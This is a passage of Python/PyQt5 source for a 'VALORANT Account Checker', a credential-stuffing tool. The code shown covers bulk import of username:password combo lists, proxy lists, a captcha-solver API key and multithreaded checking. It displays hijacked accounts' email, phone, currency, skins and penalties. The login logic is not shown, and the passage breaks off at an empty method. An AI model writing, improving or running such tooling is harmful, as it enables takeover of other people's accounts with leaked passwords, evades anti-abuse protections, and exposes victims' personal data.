        title = QLabel("VALORANT Account Checker")
        title.setFont(QFont("Arial", 16, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)
        combo_group = QGroupBox("Combo List")
        combo_layout = QVBoxLayout()
        combo_group.setLayout(combo_layout)
        self.combo_count_label = QLabel("Loaded: 0 combos")
        combo_layout.addWidget(self.combo_count_label)
        import_btn = QPushButton("Import Combos")
        import_btn.clicked.connect(self.import_combos)
        combo_layout.addWidget(import_btn)
        clear_btn = QPushButton("Clear Storage")
        clear_btn.clicked.connect(self.clear_storage)
        combo_layout.addWidget(clear_btn)
        layout.addWidget(combo_group)
        proxy_group = QGroupBox("Proxy Settings")
        proxy_layout = QVBoxLayout()
        proxy_group.setLayout(proxy_layout)
        self.proxy_count_label = QLabel("Loaded: 0 proxies")
        proxy_layout.addWidget(self.proxy_count_label)
        import_proxy_btn = QPushButton("Import Proxies")
        import_proxy_btn.clicked.connect(self.import_proxies)
        proxy_layout.addWidget(import_proxy_btn)
        disable_proxy_btn = QPushButton("Disable Proxies")
        disable_proxy_btn.clicked.connect(self.disable_proxies)
        proxy_layout.addWidget(disable_proxy_btn)
        layout.addWidget(proxy_group)
        captcha_group = QGroupBox("Captcha Settings")
        captcha_layout = QVBoxLayout()
        captcha_group.setLayout(captcha_layout)
        self.api_key_input = QLineEdit()
        self.api_key_input.setPlaceholderText("Enter Captcha Solver API Key")
        self.api_key_input.setEchoMode(QLineEdit.Password)
        captcha_layout.addWidget(self.api_key_input)
        self.remember_me_checkbox = QCheckBox("Remember Me")
        self.remember_me_checkbox.setChecked(True)
        captcha_layout.addWidget(self.remember_me_checkbox)
        self.validate_btn = QPushButton("Validate")
        self.validate_btn.clicked.connect(self.check_captcha_balance)
        captcha_layout.addWidget(self.validate_btn)
        self.balance_label = QLabel("Balance: $0.00")
        captcha_layout.addWidget(self.balance_label)
        layout.addWidget(captcha_group)
        # Options toggles
        toggles_group = QGroupBox("Options")
        toggles_layout = QVBoxLayout()
        toggles_group.setLayout(toggles_layout)
        self.use_captcha_checkbox = QCheckBox("Use Captcha Solver")
        self.use_captcha_checkbox.setChecked(True)
        toggles_layout.addWidget(self.use_captcha_checkbox)
        self.use_proxies_checkbox = QCheckBox("Use Proxies")
        self.use_proxies_checkbox.setChecked(False)
        self.use_proxies_checkbox.stateChanged.connect(self._on_use_proxies_changed)
        toggles_layout.addWidget(self.use_proxies_checkbox)
        layout.addWidget(toggles_group)
        thread_group = QGroupBox("Thread Settings")
        thread_layout = QHBoxLayout()
        thread_group.setLayout(thread_layout)
        thread_layout.addWidget(QLabel("Threads:"))
        self.thread_spinbox = QSpinBox()
        self.thread_spinbox.setMinimum(1)
        self.thread_spinbox.setMaximum(20)
        self.thread_spinbox.setValue(15)
        thread_layout.addWidget(self.thread_spinbox)
        layout.addWidget(thread_group)
        # Single Account Check
        single_group = QGroupBox("Single Account Check")
        single_layout = QVBoxLayout()
        single_group.setLayout(single_layout)
        from PyQt5.QtWidgets import QFormLayout
        form = QFormLayout()
        self.single_user_input = QLineEdit()
        self.single_pass_input = QLineEdit()
        self.single_pass_input.setEchoMode(QLineEdit.Password)
        form.addRow("Username", self.single_user_input)
        form.addRow("Password", self.single_pass_input)
        single_layout.addLayout(form)
        single_btn = QPushButton("Check Now")
        single_btn.clicked.connect(self.single_account_check)
        single_layout.addWidget(single_btn)
        layout.addWidget(single_group)
        self.start_btn = QPushButton("START")
        self.start_btn.setStyleSheet("background-color: #00AA00; color: white; font-weight: bold; padding: 10px;")
        self.start_btn.clicked.connect(self.start_checking)
        layout.addWidget(self.start_btn)
        self.stop_btn = QPushButton("STOP")
        self.stop_btn.setStyleSheet("background-color: #AA0000; color: white; font-weight: bold; padding: 10px;")
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        layout.addWidget(self.stop_btn)
        stats_group = QGroupBox("Statistics")
        stats_layout = QVBoxLayout()
        stats_group.setLayout(stats_layout)
        self.stats_label = QLabel("Checked: 0\nValid: 0\nInvalid: 0\nErrors: 0")
        stats_layout.addWidget(self.stats_label)
        layout.addWidget(stats_group)
        layout.addStretch()
        return panel
    
    def create_right_panel(self):
        panel = QWidget()
        layout = QVBoxLayout()
        panel.setLayout(layout)
        # Results header with settings button
        results_header = QHBoxLayout()
        results_label = QLabel("Valid Accounts")
        results_label.setFont(QFont("Arial", 12, QFont.Bold))
        results_header.addWidget(results_label)
        results_header.addStretch()
        settings_btn = QPushButton("⚙ Settings")
        settings_btn.setFixedWidth(100)
        settings_btn.clicked.connect(self.show_settings_dialog)
        results_header.addWidget(settings_btn)
        layout.addLayout(results_header)
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(15)
        self.results_table.setHorizontalHeaderLabels(["#", "REGION", "USERNAME", "RIOT ID", "LEVEL", "VP", "RD", "SKINS", "AGENTS", "RANK", "EMAIL", "PHONE", "MATCHES", "PENALTIES", "COUNTRY"])
        self.results_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.results_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.results_table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.results_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.results_table.customContextMenuRequested.connect(self._show_context_menu)
        header = self.results_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.Fixed)
        header.setSectionResizeMode(3, QHeaderView.Fixed)
        header.setSectionResizeMode(4, QHeaderView.Fixed)
        header.setSectionResizeMode(5, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(6, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(7, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(8, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(9, QHeaderView.Stretch)
        header.setSectionResizeMode(10, QHeaderView.Stretch)
        header.setSectionResizeMode(11, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(12, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(13, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(14, QHeaderView.ResizeToContents)
        self.results_table.setColumnWidth(2, 120)
        self.results_table.setColumnWidth(3, 120)
        self.results_table.setColumnWidth(4, 60)
        layout.addWidget(self.results_table)
        logs_label = QLabel("Live Logs")
        logs_label.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(logs_label)
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.logs_text.setMaximumHeight(200)
        layout.addWidget(self.logs_text)
        copy_logs_btn = QPushButton("Copy Logs")
        copy_logs_btn.clicked.connect(self.copy_logs)
        layout.addWidget(copy_logs_btn)
        return panel
    
    def apply_dark_theme(self):
        dark_stylesheet = """
        QMainWindow, QWidget { background-color: #1e1e1e; color: #ffffff; }
        QGroupBox { border: 1px solid #444444; border-radius: 5px; margin-top: 10px; padding: 10px; font-weight: bold; }
        QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
        QPushButton { background-color: #2d2d2d; color: white; border: 1px solid #555555; border-radius: 3px; padding: 8px; font-size: 12px; }
        QPushButton:hover { background-color: #3d3d3d; }
        QPushButton:pressed { background-color: #1d1d1d; }
        QPushButton:disabled { background-color: #1a1a1a; color: #666666; }
        QLineEdit, QSpinBox { background-color: #2d2d2d; color: white; border: 1px solid #555555; border-radius: 3px; padding: 5px; }
        QTextEdit { background-color: #2d2d2d; color: #cccccc; border: 1px solid #555555; border-radius: 3px; }
        QTableWidget { background-color: #2d2d2d; color: white; gridline-color: #444444; border: 1px solid #555555; }
        QTableWidget::item { padding: 5px; }
        QTableWidget::item:selected { background-color: #0066cc; }
        QHeaderView::section { background-color: #3d3d3d; color: white; padding: 5px; border: 1px solid #555555; font-weight: bold; }
        QLabel { color: white; }
        """
        self.setStyleSheet(dark_stylesheet)
    
    def import_combos(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Import Combos", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                # Stream processing - NO SIZE LIMITS
                combos = []
                skipped = 0
                total_lines = 0
                BATCH_SIZE = 1000
                current_batch = []
                
                # Try multiple encodings
                encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252', 'iso-8859-1']
                file_handle = None
                encoding_used = None
                
                for enc in encodings:
                    try:
                        file_handle = open(file_path, 'r', encoding=enc, errors="ignore")
                        file_handle.readline()  # Test read
                        file_handle.seek(0)
                        encoding_used = enc
                        break
                    except Exception:
                        if file_handle:
                            try:
                                file_handle.close()
                            except:
                                pass
                        file_handle = None
                        continue
                
                if not file_handle:
                    QMessageBox.critical(self, "Error", "Could not read file with any supported encoding")
                    return
                
                try:
                    for line_num, line in enumerate(file_handle, 1):
                        total_lines += 1
                        
                        # Process UI events periodically (less frequently for better performance)
                        if line_num % 5000 == 0:  # Reduced frequency from 1000 to 5000
                            QApplication.processEvents()
                        
                        try:
                            line = line.strip()
                            if not line or line.startswith('#') or line.startswith('//'):
                                continue
                            
                            separator = None
                            if ':' in line:
                                separator = ':'
                            elif '|' in line:
                                separator = '|'
                            elif ';' in line:
                                separator = ';'
                            
                            if separator:
                                parts = line.split(separator, 1)
                                if len(parts) == 2:
                                    username = parts[0].strip()
                                    password = parts[1].strip()
                                    if username and password:
                                        current_batch.append((username, password))
                                        
                                        # Process batch when it reaches size
                                        if len(current_batch) >= BATCH_SIZE:
                                            try:
                                                added, added_combos = self.storage.add_combos(current_batch)
                                                combos.extend(added_combos)
                                                current_batch = []
                                                QApplication.processEvents()
                                            except Exception as e:
                                                try:
                                                    self.add_log_entry(f"Error processing batch: {e}", "ERROR")
                                                except:
                                                    pass
                                                current_batch = []
                                                continue
                                    else:
                                        skipped += 1
                                else:
                                    skipped += 1
                            else:
                                skipped += 1
                        except Exception as e:
                            skipped += 1
                            continue
                    
                    # Process remaining batch
                    if current_batch:
                        try:
                            added, added_combos = self.storage.add_combos(current_batch)
                            combos.extend(added_combos)
                        except Exception as e:
                            try:
                                self.add_log_entry(f"Error processing final batch: {e}", "ERROR")
                            except:
                                pass
                    
                    if combos:
                        stats = self.storage.get_statistics()
                        total_count = stats['total']
                        try:
                            self.combo_count_label.setText(f"Loaded: {total_count} combos")
                        except:
                            pass
                        duplicates = len(combos) - len([c for c in combos if c])
                        msg = f"Processed {len(combos)} combos from {_os.path.basename(file_path)} (encoding: {encoding_used})"
                        if skipped > 0:
                            msg += f", {skipped} invalid lines"
                        try:
                            self.add_log_entry(msg, "INFO")
                        except:
                            pass
                        try:
                            if len(combos) > 0:
                                self._add_combos_to_table(combos[:100])  # Show first 100 in table
                            self._load_existing_combos()
                        except Exception as e:
                            try:
                                self.add_log_entry(f"Error updating table: {e}", "ERROR")
                            except:
                                pass
                    else:
                        try:
                            self.add_log_entry(f"No valid combos found in {_os.path.basename(file_path)} (checked {total_lines} lines, skipped {skipped})", "WARNING")
                            QMessageBox.warning(self, "Warning", "No valid combos found!\n\nExpected format: username:password | username|password | username;password")
                        except:
                            pass
                finally:
                    try:
                        file_handle.close()
                    except:
                        pass
            except Exception as e:
                try:
                    self.add_log_entry(f"Error importing combos: {e}", "ERROR")
                    QMessageBox.critical(self, "Error", f"Failed to import combos: {e}")
                except:
                    pass  # Never crash
    
    def import_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Import Proxies", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = [line.strip() for line in f.readlines() if line.strip()]
                loaded = self.proxy_manager.load_proxies(lines)
                self.proxy_count_label.setText(f"Loaded: {loaded} proxies")
                self.add_log_entry(f"Imported {loaded} proxies", "INFO")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to import proxies: {e}")
    
    def disable_proxies(self):
        self.proxy_manager.disable()
        self.proxy_count_label.setText("Proxies disabled")
        self.add_log_entry("Proxies disabled", "INFO")
    
    def clear_storage(self):
        reply = QMessageBox.question(self, "Confirm Clear", "Are you sure you want to clear all combos from the storage?", QMessageBox.Yes | QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.storage.clear_storage()
            self.combo_count_label.setText("Loaded: 0 combos")
            self.results_table.setRowCount(0)
            self.add_log_entry("Storage cleared", "INFO")
    
    def check_captcha_balance(self):
        api_key = self.api_key_input.text().strip()
        if not api_key:
            QMessageBox.warning(self, "Warning", "Please enter API key first")
            return
        self.captcha_solver.api_key = api_key
        balance = self.captcha_solver.get_balance()
        if balance is not None:
            self.balance_label.setText(f"Balance: ${balance:.2f}")
            self.add_log_entry(f"\u2705 API Key validated! Balance: ${balance:.2f}", "SUCCESS")
            if self.remember_me_checkbox.isChecked():
                self._save_api_key(api_key)
                self.add_log_entry("API configuration saved locally", "INFO")
            QMessageBox.information(self, "Success", f"API Key validated!\nBalance: ${balance:.2f}")
        else:
            self.add_log_entry("\u274c Failed to validate API key", "ERROR")
            QMessageBox.critical(self, "Error", "Failed to validate API key. Check your key and try again.")

    def start_checking(self):
        api_key = self.api_key_input.text().strip()
        if self.use_captcha_checkbox.isChecked():
            if not api_key:
                QMessageBox.warning(self, "Warning", "Please enter Captcha Solver API key first")
                return
            self.captcha_solver.api_key = api_key
            # Auto-save API key if user opted to remember it, even if they didn't click Validate
            if self.remember_me_checkbox.isChecked():
                self._save_api_key(api_key)
                self.add_log_entry("API key saved for future sessions", "INFO")
        self.checker.use_captcha_solver = self.use_captcha_checkbox.isChecked()
        if not self.use_proxies_checkbox.isChecked():
            self.proxy_manager.disable()
        stats = self.storage.get_statistics()
        if stats['pending'] == 0:
            QMessageBox.warning(self, "Warning", "No pending combos to check")
            return
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.checker_thread = CheckerThread(self.checker)
        self.checker_thread.thread_count = self.thread_spinbox.value()
        self.checker_thread.finished_signal.connect(self.on_checking_finished)
        self.checker_thread.start()
        self.add_log_entry("Started checking process", "SUCCESS")
    
    def _on_use_proxies_changed(self, state):
        if state == Qt.Checked:
            if getattr(self.proxy_manager, 'proxies', None):
                if len(self.proxy_manager.proxies) > 0:
                    self.proxy_manager.enabled = True
                    self.proxy_count_label.setText(f"Loaded: {len(self.proxy_manager.proxies)} proxies")
        else:
            self.proxy_manager.disable()
            self.proxy_count_label.setText("Proxies disabled")
    
    def stop_checking(self):
        self.checker.stop_checking()
        self.stop_btn.setEnabled(False)
        self.add_log_entry("Stopping checker...", "WARNING")
    
    def on_checking_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.add_log_entry("Checking process completed", "SUCCESS")
        self.refresh_results_table()
    
    def single_account_check(self):
        username = self.single_user_input.text().strip()
        password = self.single_pass_input.text().strip()
        if not username or not password:
            QMessageBox.warning(self, "Warning", "Please enter both username and password")
            return
        if self.use_captcha_checkbox.isChecked():
            api_key = self.api_key_input.text().strip()
            if not api_key:
                QMessageBox.warning(self, "Warning", "Please enter Captcha Solver API key or disable captcha solver")
                return
            self.captcha_solver.api_key = api_key
        self.checker.use_captcha_solver = self.use_captcha_checkbox.isChecked()
        if not self.use_proxies_checkbox.isChecked():
            self.proxy_manager.disable()
        added, added_combos = self.storage.add_combos([(username, password)])
        if added == 0:
            combo_id = None
            for c in self.storage.get_all_combos():
                if c['username'] == username and c['password'] == password:
                    combo_id = c['id']
                    break
            if combo_id is None:
                self.add_log_entry("Failed to enqueue single account", "ERROR")
                return
        else:
            combo_id = added_combos[0]['id']
            self._add_combos_to_table(added_combos)
        def _run():
            try:
                self.checker.check_single_by_id(combo_id, username, password)
            finally:
                self.refresh_results_table()
        t = _threading2.Thread(target=_run, daemon=True)
        t.start()
    
    def add_log_entry(self, message: str, level: str = "INFO"):
        from PyQt5.QtCore import QMetaObject, Qt as _Qt, Q_ARG
        color_map = {'INFO': '#cccccc', 'SUCCESS': '#00ff00', 'ERROR': '#ff0000', 'WARNING': '#ffaa00', 'DEBUG': '#888888'}
        
        # Rate limiting to prevent UI lag with rapid log messages
        current_time = _time.time()
        if not hasattr(self, '_last_log_time'):
            self._last_log_time = 0
        
        # Skip logs if they come too frequently (more than 5 per second for better performance)
        if current_time - self._last_log_time < 0.2:  # Increased from 0.1s to 0.2s (5/sec instead of 10/sec)
            return
        
        self._last_log_time = current_time
        
        def _update_gui():
            color = color_map.get(level, '#cccccc')
            formatted = f'<span style="color: {color};">{message}</span>'
            self.logs_text.append(formatted)
            scrollbar = self.logs_text.verticalScrollBar()
            scrollbar.setValue(scrollbar.maximum())
        
        if _threading2.current_thread() is _threading2.main_thread():
            _update_gui()
        else:
            color = color_map.get(level, "#cccccc")
            formatted_message = f'<span style="color: {color};">{message}</span>'
            QMetaObject.invokeMethod(self.logs_text, "append", _Qt.QueuedConnection, Q_ARG(str, formatted_message))
            self.scroll_logs_signal.emit()
    
    @pyqtSlot()
    def _scroll_logs_to_bottom(self):
        scrollbar = self.logs_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def update_stats(self, stats: dict):
        self.stats_label.setText(
            f"Checked: {stats.get('checked', 0)}\n"
            f"Valid: {stats.get('valid', 0)}\n"
            f"Invalid: {stats.get('invalid', 0)}\n"
            f"Errors: {stats.get('errors', 0)}"
        )
        self.refresh_results_table()
    
    def _load_settings(self):
        """Load settings from config file"""
        default_settings = {
            'show_credentials': True,
            'show_status': True,
            'show_level': True,
            'show_vp': True,
            'show_rd': True,
            'show_kc': True,
            'show_rank': True,
            'show_skins': True,
            'show_buddies': True,
            'show_cards': True,
            'show_sprays': True,
            'show_chromas': True,
            'show_skin_levels': True,
            'show_matches': True,
            'show_email': True,
            'show_phone': True,
            'show_penalties': True,
            'show_country': True,
        }
        try:
            config_file = get_file_path("checker_config.json")
            if _os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    config = json.load(f)
                    if 'settings' in config:
                        default_settings.update(config['settings'])
        except Exception as e:
            self.add_log_entry(f"Error loading settings: {e}", "ERROR")
        return default_settings
    
    def _save_settings(self):
        """Save settings to config file"""
        try:
            config_file = get_file_path("checker_config.json")
            config = {}
            if _os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    config = json.load(f)
            config['settings'] = self.settings
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=2)
            # Also update global SETTINGS
            global SETTINGS
            SETTINGS.update(self.settings)
        except Exception as e:
            self.add_log_entry(f"Error saving settings: {e}", "ERROR")
    
    def _apply_column_visibility(self):
        """Apply column visibility based on settings"""
        if not hasattr(self, 'results_table'):
            return
        for col_idx, setting_key in self.column_settings_map.items():
            if col_idx < self.results_table.columnCount():
                visible = self.settings.get(setting_key, True)
                self.results_table.setColumnHidden(col_idx, not visible)
    
    def show_settings_dialog(self):
        """Show settings dialog for column visibility"""
        dialog = QDialog(self)
        dialog.setWindowTitle("Column Visibility Settings")
        dialog.setGeometry(300, 300, 400, 600)
        dialog.setStyleSheet(self.styleSheet())
        
        layout = QVBoxLayout()
        dialog.setLayout(layout)
        
        # Title
        title_label = QLabel("Select columns to display:")
        title_label.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(title_label)
        
        # Scroll area for checkboxes
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_widget = QWidget()
        scroll_layout = QVBoxLayout()
        scroll_widget.setLayout(scroll_layout)
        
        # Column name mapping
        column_names = {
            'show_credentials': 'Username & Riot ID',
            'show_level': 'Level',
            'show_vp': 'Valorant Points (VP)',
            'show_rd': 'Radianite Points (RD)',
            'show_skins': 'Skins & Agents',
            'show_rank': 'Rank',
            'show_email': 'Email',
            'show_phone': 'Phone',
            'show_matches': 'Matches',
            'show_penalties': 'Penalties',
            'show_country': 'Country',
        }
        
        # Create checkboxes for each setting
        self.settings_checkboxes = {}
        for key, label in column_names.items():
            checkbox = QCheckBox(label)
            checkbox.setChecked(self.settings.get(key, True))
            self.settings_checkboxes[key] = checkbox
            scroll_layout.addWidget(checkbox)
        
        scroll_layout.addStretch()
        scroll_area.setWidget(scroll_widget)
        layout.addWidget(scroll_area)
        
        # Buttons
        button_layout = QHBoxLayout()
        select_all_btn = QPushButton("Select All")
        select_all_btn.clicked.connect(lambda: self._select_all_settings(True))
        button_layout.addWidget(select_all_btn)
        
        deselect_all_btn = QPushButton("Deselect All")
        deselect_all_btn.clicked.connect(lambda: self._select_all_settings(False))
        button_layout.addWidget(deselect_all_btn)
        
        button_layout.addStretch()
        
        save_btn = QPushButton("Save")
        save_btn.clicked.connect(lambda: self._save_settings_from_dialog(dialog))
        button_layout.addWidget(save_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(dialog.close)
        button_layout.addWidget(cancel_btn)
        
        layout.addLayout(button_layout)
        dialog.exec_()
    
    def _select_all_settings(self, checked: bool):
        """Select or deselect all checkboxes"""
        for checkbox in self.settings_checkboxes.values():
            checkbox.setChecked(checked)
    
    def _save_settings_from_dialog(self, dialog):
        """Save settings from dialog and apply them"""
        for key, checkbox in self.settings_checkboxes.items():
            self.settings[key] = checkbox.isChecked()
        self._save_settings()
        self._apply_column_visibility()
        dialog.close()
        self.add_log_entry("Settings saved", "INFO")
        self.refresh_results_table()
    
    def refresh_results_table(self):
        all_combos = self.storage.get_all_combos()
        self._populate_results_table(all_combos)
    
    def copy_logs(self):
        logs_text = self.logs_text.toPlainText()
        clipboard = QApplication.clipboard()
        clipboard.setText(logs_text)
        self.add_log_entry("Logs copied to clipboard", "INFO")
    
    def _show_context_menu(self, position):
        item = self.results_table.itemAt(position)
        if item is None:
            return
        row = item.row()
        region_item = self.results_table.item(row, 1)
        if region_item is None:
            return
        status_text = region_item.text()
        if status_text != "Pending":
            menu = QMenu(self)
            action_copy = QAction("Copy Account Details", self)
            action_copy.triggered.connect(lambda: self._copy_account_details(row))
            menu.addAction(action_copy)
            action_export = QAction("Export Account", self)
            action_export.triggered.connect(lambda: self._export_account(row))
            menu.addAction(action_export)
            username_item = self.results_table.item(row, 2)
            if username_item and status_text != "Invalid":
                action_skin_list = QAction("Skin List", self)
                action_skin_list.triggered.connect(lambda: self._show_skin_list(row))
                menu.addAction(action_skin_list)
            menu.addSeparator()
            action_delete = QAction("Delete Account", self)
            action_delete.triggered.connect(lambda: self._delete_account(row))
            menu.addAction(action_delete)
            menu.exec_(self.results_table.mapToGlobal(position))
    
    def _copy_account_details(self, row):
        self.add_log_entry("Copy Account Details - Feature coming soon!", "INFO")
    
    def _export_account(self, row):
        self.add_log_entry("Export Account - Feature coming soon!", "INFO")
    
    def _delete_account(self, row):
        self.add_log_entry("Delete Account - Feature coming soon!", "INFO")
    
    def _show_skin_list(self, row):
        try:
            username_item = self.results_table.item(row, 2)
            if not username_item:
                self.add_log_entry("Could not get account username", "ERROR")
                return
            username = username_item.text()
            combo_data = None
            for combo in self.storage.get_all_combos():
                if combo['username'] == username and combo['status'] == 'valid':
                    combo_data = combo
                    break
            if not combo_data:
                self.add_log_entry(f"Could not find account data for {username}", "ERROR")
                return
            self._create_skin_list_dialog(username, combo_data)
        except Exception as e:
            self.add_log_entry(f"Error showing skin list: {e}", "ERROR")
    
    def _create_skin_list_dialog(self, username, combo_data):
        dialog = QDialog(self)
        dialog.setWindowTitle(f"Cosmetics - {username}")
        dialog.setGeometry(200, 200, 1200, 800)
        dialog.setStyleSheet(self.styleSheet())
        layout = QVBoxLayout()
        dialog.setLayout(layout)
        title_label = QLabel(f"Cosmetics for {username}")
        title_label.setFont(QFont("Arial", 14, QFont.Bold))
        layout.addWidget(title_label)
        tab_widget = QTabWidget()
        skin_details = combo_data.get('skin_details', [])
        buddies = combo_data.get('buddies', [])
        player_cards = combo_data.get('player_cards', [])
        sprays = combo_data.get('sprays', [])
        weapon_skins = combo_data.get('weapon_skins', [])
        skin_chromas = combo_data.get('skin_chromas', [])
        skin_levels = combo_data.get('skin_levels', [])
        tab_widget.addTab(self._create_skins_tab(skin_details), f"EQUIPPED SKINS ({len(skin_details)})")
        tab_widget.addTab(self._create_skins_image_tab(skin_details), f"EQUIPPED SKINS (IMAGES) ({len(skin_details)})")
        tab_widget.addTab(self._create_skins_tab(weapon_skins), f"ALL SKINS ({len(weapon_skins)})")
        tab_widget.addTab(self._create_skins_image_tab(weapon_skins), f"ALL SKINS (IMAGES) ({len(weapon_skins)})")
        tab_widget.addTab(self._create_skin_statistics_tab(combo_data), "SKIN STATISTICS")
        tab_widget.addTab(self._create_items_list_tab(buddies, "Buddy"), f"BUDDIES ({len(buddies)})")
        tab_widget.addTab(self._create_items_list_tab(player_cards, "Player Card"), f"PLAYER CARDS ({len(player_cards)})")
        tab_widget.addTab(self._create_items_list_tab(sprays, "Spray"), f"SPRAYS ({len(sprays)})")
        tab_widget.addTab(self._create_uuid_list_tab(skin_chromas, "Skin Chroma"), f"CHROMAS ({len(skin_chromas)})")
        tab_widget.addTab(self._create_uuid_list_tab(skin_levels, "Skin Level"), f"SKIN LEVELS ({len(skin_levels)})")
        tab_widget.addTab(self._create_account_info_tab(combo_data), "ACCOUNT INFO")
        layout.addWidget(tab_widget)
        button_layout = QHBoxLayout()
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.close)
        button_layout.addWidget(close_btn)
        layout.addLayout(button_layout)
        dialog.exec_()
    
    def _create_skins_tab(self, skin_details):
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        if not skin_details:
            label = QLabel("No skins available")
            label.setAlignment(Qt.AlignCenter)
            layout.addWidget(label)
            return widget
        table = QTableWidget()
        table.setColumnCount(3)
        table.setHorizontalHeaderLabels(["Skin Name", "Weapon", "Rarity"])
        table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectRows)
        table.setRowCount(len(skin_details))
        for row, skin in enumerate(skin_details):
            skin_name = skin.get('name', 'Unknown Skin')
            weapon_name = skin.get('weapon', 'Unknown')
            rarity = skin.get('rarity', 'Unknown')
            table.setItem(row, 0, QTableWidgetItem(skin_name))
            table.setItem(row, 1, QTableWidgetItem(weapon_name))
            table.setItem(row, 2, QTableWidgetItem(rarity))
        header = table.horizontalHeader()
        for i in range(3):
            header.setSectionResizeMode(i, QHeaderView.Stretch)
        layout.addWidget(table)
        button_layout = QHBoxLayout()
        copy_btn = QPushButton("Copy Skin List")
        copy_btn.clicked.connect(lambda: self._copy_skin_list(skin_details))
        button_layout.addWidget(copy_btn)
        button_layout.addStretch()
        layout.addLayout(button_layout)
        return widget
    
    def _create_skins_image_tab(self, skin_details):
        """Create a tab displaying skins as images in a grid layout"""
        widget = QWidget()
        main_layout = QVBoxLayout()
        widget.setLayout(main_layout)
        
        if not skin_details:
            label = QLabel("No skins available")
            label.setAlignment(Qt.AlignCenter)
            main_layout.addWidget(label)
            return widget
        
        # Create scroll area for the grid
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }")
        
        # Container widget for the grid
        grid_widget = QWidget()
        grid_layout = QGridLayout()
        grid_widget.setLayout(grid_layout)
        grid_layout.setSpacing(15)
        
        # Create skin cards in grid
        import requests
        cols = 4  # Number of columns in the grid
        for idx, skin in enumerate(skin_details):
            row = idx // cols
            col = idx % cols
            
            # Create card widget
            card = QWidget()
            card.setFixedSize(200, 250)
            card.setStyleSheet("""
                QWidget {
                    background-color: #2b2b2b;
                    border: 1px solid #3d3d3d;
                    border-radius: 8px;
                }
            """)
            card_layout = QVBoxLayout()
            card_layout.setContentsMargins(5, 5, 5, 5)
            card_layout.setSpacing(5)
            card.setLayout(card_layout)
            
            # Image label
            image_label = QLabel()
            image_label.setFixedSize(190, 190)
            image_label.setAlignment(Qt.AlignCenter)
            image_label.setStyleSheet("""
                QLabel {
                    background-color: #1e1e1e;
                    border: 1px solid #3d3d3d;
                    border-radius: 4px;
                }
            """)
            image_label.setText("Loading...")
            
            # Name label
            name_label = QLabel()
            name_label.setAlignment(Qt.AlignCenter)
            name_label.setWordWrap(True)
            name_label.setStyleSheet("color: #ffffff; font-size: 11px;")
            skin_name = skin.get('name', 'Unknown Skin')
            weapon_name = skin.get('weapon', 'Unknown')
            name_label.setText(f"{skin_name}\n({weapon_name})")
            
            card_layout.addWidget(image_label)
            card_layout.addWidget(name_label)
            
            # Load image asynchronously (using requests + threading, no UI blocking)
            image_url = skin.get('image_url')
            if image_url:
                # Use async loading to avoid blocking UI
                self._load_skin_image_for_dialog(image_label, image_url, 190)
            else:
                image_label.setText("No URL")
            
            grid_layout.addWidget(card, row, col)
        
        scroll_area.setWidget(grid_widget)
        main_layout.addWidget(scroll_area)
        
        return widget
    
    def _load_skin_image_for_dialog(self, label, image_url, size=190):
        """Load skin image from URL using QNetworkAccessManager (same as test script)"""
        # Just use the same method with different size
        # Note: This is in MainWindow, but we need QNetworkAccessManager approach
        # For now, create a simple wrapper that uses QNetworkAccessManager
        from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply
        
        # Validate URL first
        if not image_url or not isinstance(image_url, str) or not image_url.strip():
            label.setText("No URL")
            label.setAlignment(Qt.AlignCenter)
            return
        
        image_url = image_url.strip()
        if not (image_url.startswith('http://') or image_url.startswith('https://')):
            label.setText("Invalid URL")
            label.setAlignment(Qt.AlignCenter)
            return
        
        # Show placeholder first
        label.setText("Loading...")
        label.setAlignment(Qt.AlignCenter)
        
        # Use shared network manager (same as test script - must persist)
        # Use lambda to capture label and size - each connection is independent
        # This allows multiple images to load simultaneously without interfering
        self.network_manager.finished.connect(
            lambda reply, lbl=label, sz=size: self._handle_image_download(reply, lbl, sz)
        )
        request = QNetworkRequest(QUrl(image_url))
        self.network_manager.get(request)
    
    def _handle_image_download(self, reply, label, size):
